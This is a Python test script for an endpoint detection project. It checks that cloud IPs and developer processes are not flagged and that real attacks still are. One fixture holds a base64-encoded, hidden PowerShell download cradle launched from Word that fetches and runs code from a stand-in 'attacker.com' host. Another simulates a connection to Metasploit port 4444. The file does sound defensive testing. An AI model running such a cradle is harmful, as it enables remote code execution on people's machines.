import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "backend"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "agent"))

from osint_engine import OSINTEngine
from detection_engine import EndpointDetectionEngine
from app.services.ml_engine import LocalMLEndpointEngine as LocalMLEngine
from app.services.detection_engine import DetectionEngine

def run_tests():
    print("==================================================")
    print("VERIFYING FALSE POSITIVE SUPPRESSION & TRUE POSITIVES")
    print("==================================================")
    
    osint = OSINTEngine()
    edr = EndpointDetectionEngine()
    
    # 1. Test Google & Cloudflare IPs in OSINT
    test_ips = ["172.217.112.4", "172.64.155.209", "52.178.17.233", "142.251.10.188", "151.101.193.91"]
    for ip in test_ips:
        res = osint.lookup_ip_reputation(ip)
        print(f"IP {ip:15} -> Verdict: {res['verdict']:6} | is_malicious: {res['is_malicious']} | score: {res['threat_score']}")
        assert res["is_malicious"] is False, f"Failed: {ip} marked as malicious!"
        assert res["verdict"] == "BENIGN", f"Failed: {ip} not BENIGN!"
    print("[PASS] All major Cloud / CDN IPs verified BENIGN with 0 threat score.")
    
    # 2. Test Agent Network Event Evaluation
    for ip in test_ips:
        net_ev = edr.evaluate_network_telemetry({"dest_ip": ip, "dest_port": 443})
        print(f"Network Ev {ip:15} -> threat_verdict: {net_ev['threat_verdict']} | mitre: {net_ev['mitre_tactics']}")
        assert net_ev["is_malicious"] is False
        assert net_ev["threat_verdict"] == "BENIGN"
        assert len(net_ev["mitre_tactics"]) == 0
    print("[PASS] Routine HTTPS network events are completely BENIGN without false C2 tags.")
    
    # 3. Test Backend OSINT Rule (OSINT-THREAT-001) does NOT fire on routine traffic
    routine_event = {
        "event_id": "EVT-TEST-001",
        "category": "network",
        "destination_ip": "172.217.112.4",
        "threat_verdict": "BENIGN",
        "is_malicious": False,
        "osint_intel": {"is_malicious": False, "threat_score": 0}
    }
    alerts = DetectionEngine.evaluate_event(routine_event)
    assert len(alerts) == 0, f"Failed: alerts generated on routine event: {alerts}"
    print("[PASS] Backend DetectionEngine generates 0 alerts for routine network events.")
    
    # 4. Test ML Engine with Benign Developer Tools
    benign_procs = [
        {"process_name": "msedgewebview2.exe", "command_line": "msedgewebview2.exe --type=renderer --user-data-dir=C:\\Users\\AppData"},
        {"process_name": "node.exe", "command_line": "node.exe C:\\Users\\project\\server.js"},
        {"process_name": "python.exe", "command_line": "python.exe -m uvicorn app.main:app"},
        {"process_name": "antigravity ide.exe", "command_line": "antigravity ide.exe --type=renderer --field-trial-handle=123"},
        {"process_name": "cmd.exe", "command_line": "cmd.exe /c echo Hello World"}
    ]
    for bp in benign_procs:
        ml_res = LocalMLEngine.analyze_detailed(bp, force_enforce=True)
        print(f"ML Proc {bp['process_name']:20} -> Verdict: {ml_res['verdict']:6} | is_alert: {ml_res['is_alert']} | risk: {ml_res['risk_score']}")
        assert ml_res["is_alert"] is False, f"Failed: alert on benign proc {bp['process_name']}"
    print("[PASS] All benign developer and system binaries correctly suppressed in ML.")
    
    # 5. Test True Positive Attacks Still Trigger Detections
    # A. PowerShell Download Cradle (SIGMA + ML)
    attack_ps = {
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3AnKQ==",
        "parent_process": "winword.exe",
        "mode": "TEST"
    }
    ml_attack = LocalMLEngine.analyze_detailed(attack_ps, force_enforce=True)
    print(f"\n[TRUE POSITIVE TEST] PowerShell Attack ML Risk: {ml_attack['risk_score']}/100 | is_alert: {ml_attack['is_alert']}")
    assert ml_attack["is_alert"] is True
    assert ml_attack["risk_score"] >= 80
    
    sigma_alerts = DetectionEngine.evaluate_event(attack_ps)
    print(f"[TRUE POSITIVE TEST] PowerShell Attack Backend Alerts: {[a['rule_id'] for a in sigma_alerts]}")
    assert any(a["rule_id"] == "SIGMA-T1059-001" for a in sigma_alerts)
    
    # B. Suspicious Metasploit Port (Agent Detection Engine)
    c2_net = edr.evaluate_network_telemetry({"dest_ip": "185.220.101.5", "dest_port": 4444})
    print(f"[TRUE POSITIVE TEST] Suspicious Port 4444: Verdict: {c2_net['threat_verdict']} | Severity: {c2_net['severity']}")
    assert c2_net["threat_verdict"] == "SUSPICIOUS"
    assert "Command and Control" in c2_net["mitre_tactics"]
    
    print("\n==================================================")
    print("ALL TESTS PASSED: FALSE POSITIVES ELIMINATED, TRUE POSITIVES RETAINED!")
    print("==================================================")

if __name__ == "__main__":
    run_tests()
